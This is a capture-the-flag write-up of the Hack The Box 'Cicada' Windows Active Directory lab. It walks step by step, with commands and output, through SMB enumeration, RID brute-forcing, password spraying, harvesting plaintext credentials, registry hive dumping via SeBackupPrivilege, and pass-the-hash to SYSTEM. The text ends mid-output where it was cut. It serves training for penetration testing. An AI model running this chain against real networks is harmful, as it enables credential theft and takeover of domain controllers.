---
title: Write-up Cicada on HTB
author: eMVee
date: 2025-03-31 00:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, OSCP, OSEP, AD, Active Directory, SeBackupPrivilege]
render_with_liquid: false
---

Today I had some time left to hack a simple machine. After looking quickly on HTB I found a machine that might be fun. Cicada is an easy Windows Active Directory machine that serves as an excellent starting point for beginners looking to grasp the fundamentals of enumeration and exploitation. This machine is particularly beneficial for those preparing for certifications like the OSCP. 

In this machine you will have to enumerate the domain, identify users, explore shared resources on a SMB share, find plaintext passwords in files, execute a password spray attack, and utilize the `SeBackupPrivilege` to achieve full system compromise.

## Getting started

It is a good habit to save your notes for each machine that will be hacked into it's own folder.
```
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB             

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Cicada    
```
After creating the project folder and changing the working folder to the newly created folder.
As soon as everything is ready we should check if the machines is online and responding to a simple ping request.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ ip=10.129.231.149 

┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ ping $ip -c 3         
PING 10.129.231.149 (10.129.231.149) 56(84) bytes of data.
64 bytes from 10.129.231.149: icmp_seq=1 ttl=127 time=40.1 ms
64 bytes from 10.129.231.149: icmp_seq=2 ttl=127 time=42.1 ms
64 bytes from 10.129.231.149: icmp_seq=3 ttl=127 time=31.8 ms

--- 10.129.231.149 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2063ms
rtt min/avg/max/mdev = 31.813/37.980/42.056/4.435 ms

```
Based on the information (ttl value of 127) we can guess that the target is probably running on a Windows operating system. Windows based systems have a value of 128 in the ttl field.
## Enumeration

All attacks should start with an enumeration phase since it would be pointless to try to hack a system without knowing what service, application or techniques is being used and vulnerable.
Therefore we should start enumerating the machine and start with a port scan. This can be done with nmap.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ sudo nmap -sCV -T4 -p- $ip          
[sudo] password for emvee: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 13:51 CEST
Nmap scan report for 10.129.231.149
Host is up (0.073s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-31 18:58:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
54936/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-03-31T18:59:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 513.43 seconds
                                                                      
```


With nmap we were able to discover some open ports and services that gives a good idea on the configuration of our target.
The following items were added to the notes:
- Windows
	- Hostname: CICADA-DC
	- Domain: cicada.htb
	- FQDN: CICADA-DC.cicada.htb
- Port 53
	- DNS
	-  Simple DNS Plus
- Port 88
	- Kerberos
- Port 135, 139, 445
	- SMB
- Port 389
	- LDAP
- Port 636
	- LDAP secure
- Port 3298 / 3269
	- Global catalog
- Port 5985
	- winrm
		- evil-winrm

Based on these services the following would be useful to exploit
- SMB for checking if a anonymous/guest user can access shares
- LDAP/Kerberos, enumerate domain users if anonymous access is allowed, find passwords or brute force the users in the domain with kerbrute for example.
- DNS, this might be useful to find (sub)domains or hosts in the network, but this is something that I do no expect in this machine
- WinRM, this is useful access the target with credentials.

Let's find out what information on the system can be found with netexec on the SMB protocol. This can give for example the version of Windows that is being used on the target.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u 'guest'
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)

```
When the following string: `Windows Server 2022 Build 2034` is being search in Google, this link is one of the results: https://betawiki.net/wiki/Windows_Server_2022_build_20344

According the website this version `Windows Server 2022 build 20344 is a preview build of Windows Server 2022 released on 28 April 2021.`  is being used.

```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u 'guest' -p '' --shares 
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON                        Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL                          Logon server share 
```
A guest user can read the `HR` folder, which gives us the opportunity to connect to the share with smbclient and check what files are in the directory and download them with `get`.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ smbclient -N //$ip/HR  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 13:29:09 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 19:31:48 2024

                4168447 blocks of size 4096. 478149 blocks available
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
```
After downloading the file we should check the content of the file to see if there is any juicy information in the file.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ cat "Notice from HR.txt" 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
We have found the default password:  `Cicada$M6Corpb*@Lp#nZp!8` for each new user in the Cicada Corp. Since we have no username yet we should try to brute force usernames with [netexec](https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid) via the `--ird-brute` argument

```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u guest -p '' --rid-brute
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```
These results are not ready to be used to spray the password with a usernames list. It is possible to add manually the users, but it would be better to make our life easier by using several commands combined to create the `usernames.txt` file containing the usernames found by the rid.

```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 > usernames.txt

┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ cat usernames.txt       
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```
Next we can spray the password with netexec against all usernames found in the previous step. 
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u usernames.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
```
We were able to find valid credentials `michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8` with netexec. Those van be used to enumerate further on the target.
Now we should query the AD with valid credentials to see if we can find new information.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users 
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.231.149  445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.231.149  445    CICADA-DC        Administrator                 2024-08-26 20:08:03 2       Built-in account for administering the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        Guest                         2024-08-28 17:26:56 2       Built-in account for guest access to the computer/domain 
SMB         10.129.231.149  445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 2       Key Distribution Center Service Account 
SMB         10.129.231.149  445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 2        
SMB         10.129.231.149  445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 2        
SMB         10.129.231.149  445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.231.149  445    CICADA-DC        david.orelious                2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 0        
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA

```
In the Description a password has been stored for an user.. Not sure why it would have the text `Just in case I forget my password is`. But this will give us a new password and potential new credentials to impersonate this user.
Let's try to see if the user can logon with this password.

```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ for protocol in winrm rdp mssql ldap vnc smb ssh wmi nfs ftp; do netexec $protocol $ip -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'; done
WINRM       10.129.231.149  5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.231.149  5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
LDAP        10.129.231.149  389    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
/usr/lib/python3/dist-packages/paramiko/pkey.py:100: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.
  "cipher": algorithms.TripleDES,
/usr/lib/python3/dist-packages/paramiko/transport.py:259: CryptographyDeprecationWarning: TripleDES has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.TripleDES and will be removed from this module in 48.0.0.
  "class": algorithms.TripleDES,
RPC         10.129.231.149  135    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
RPC         10.129.231.149  135    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 

```
Since we got some valid credentials we should check if this user has other permissions on the SMB share.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u 'cicada.htb\david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$                              Default share
SMB         10.129.231.149  445    CICADA-DC        DEV             READ            
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share 

```
This user has permissions to read the DEV share. This might be interesting, so we should check this share and see if we can find some juicy information.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ smbclient //$ip/DEV -U 'cicada.htb\david.orelious'                    
Password for [CICADA.HTB\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 13:31:39 2024
  ..                                  D        0  Thu Mar 14 13:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 19:28:22 2024

                4168447 blocks of size 4096. 476620 blocks available
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
smb: \> 
```
After downloading the PowerShell script we should check the content of this file.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ cat Backup_script.ps1

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```
New credentials can be found in this PowerShell script. Let's see if this user can check other shares on the SMB server and perhaps we are lucky to gain access to the system with this user.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ netexec smb $ip -u usernames.txt -p 'Q!3@Lp#M6b*7t*Vt' --shares
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\michael.wrightson:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [-] cicada.htb\david.orelious:Q!3@Lp#M6b*7t*Vt STATUS_LOGON_FAILURE 
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
SMB         10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB         10.129.231.149  445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.231.149  445    CICADA-DC        -----           -----------     ------
SMB         10.129.231.149  445    CICADA-DC        ADMIN$          READ            Remote Admin
SMB         10.129.231.149  445    CICADA-DC        C$              READ,WRITE      Default share
SMB         10.129.231.149  445    CICADA-DC        DEV                             
SMB         10.129.231.149  445    CICADA-DC        HR              READ            
SMB         10.129.231.149  445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.231.149  445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.231.149  445    CICADA-DC        SYSVOL          READ            Logon server share
```
We have read and write access to the `C$` folder on the target. This sounds like music to my ears.

## Initial access
Now we can try to logon to the target with `evil-winrm` since we got some valid credentials.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ evil-winrm -i $ip -u 'cicada.htb\emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'                            
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

```
We got initial access to the system. Let's capture the details like it was for the OSCP exam.
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> hostname
CICADA-DC
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1a4
   IPv6 Address. . . . . . . . . . . : dead:beef::5d1e:4525:a0e9:86be
   Link-local IPv6 Address . . . . . : fe80::e3b2:74f9:e015:c6e4%6
   IPv4 Address. . . . . . . . . . . : 10.129.231.149
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%6
                                       10.129.0.1
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> dir ../desktop


    Directory: C:\Users\emily.oscars.CICADA\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         3/31/2025  11:50 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> type ../desktop/user.txt
<---- SNIP USER FLAG ---->
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

```
Now we should check what privileges this user has.
```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> 

```

The user has some interesting permissions `SeBackupPrivilege` and `SeRestorePrivilege`
## Privilege escalation
`SeBackupPrivilege` is a Windows privilege that allows a user to bypass file security to back up files and directories. This privilege can be dangerous for privilege escalation because it enables an attacker to access sensitive files, including password hashes and configuration files, without needing explicit permissions.

Once an attacker gains access to these files, they can potentially extract sensitive information or modify system configurations to elevate their privileges.

In this case we can use the permissions to dump the hash from the system.

```
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd c:\
*Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/31/2025   2:16 PM                Temp


*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.

*Evil-WinRM* PS C:\> cd c:\temp
*Evil-WinRM* PS C:\temp> dir


    Directory: C:\temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/31/2025   2:17 PM          49152 sam
-a----         3/31/2025   2:17 PM       18558976 system


*Evil-WinRM* PS C:\temp> 

```
Now we should download the two files via evil-winrm to our attacking machine.
```
*Evil-WinRM* PS C:\temp> download sam
                                        
Info: Downloading C:\temp\sam to sam
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system
                                        
Info: Downloading C:\temp\system to system
                                        
Info: Download successful!

```
Now we should check if the files are transferred correctly on our attacker machine.
```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ ll                                                                            
total 18184
-rw-r--r-- 1 emvee emvee      601 Mar 31 15:58  Backup_script.ps1
-rw-r--r-- 1 emvee emvee     1266 Mar 31 15:03 'Notice from HR.txt'
-rw-rw-r-- 1 emvee emvee    49152 Mar 31 16:17  sam
-rw-rw-r-- 1 emvee emvee 18558976 Mar 31 16:21  system
-rw-rw-r-- 1 emvee emvee      113 Mar 31 15:23  usernames.txt
```
The `sam` and `system` file do have the same size as on the victim, this means the file have been transferred correctly. Now we can use `secretsdump` to retrieve the NTLM hashes of the local administrator for example.

```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up... 

```
With the NTLM hash of the local administrator we can logon to the domain controller via `impacket-psexec`. This will give us full access to the system.

```
┌──(emvee㉿kali)-[~/Documents/HTB/Cicada]
└─$ impacket-psexec administrator@$ip -hashes ':2b87e7c93a3e8a0ea4a581937016f341'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.231.149.....
[*] Found writable share ADMIN$
[*] Uploading file zrcwMZVc.exe
[*] Opening SVCManager on 10.129.231.149.....
[*] Creating service LumQ on 10.129.231.149.....
[*] Starting service LumQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
CICADA-DC

C:\Windows\system32> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1a4
   IPv6 Address. . . . . . . . . . . : dead:beef::5d1e:4525:a0e9:86be
   Link-local IPv6 Address . . . . . : fe80::e3b2:74f9:e015:c6e4%6
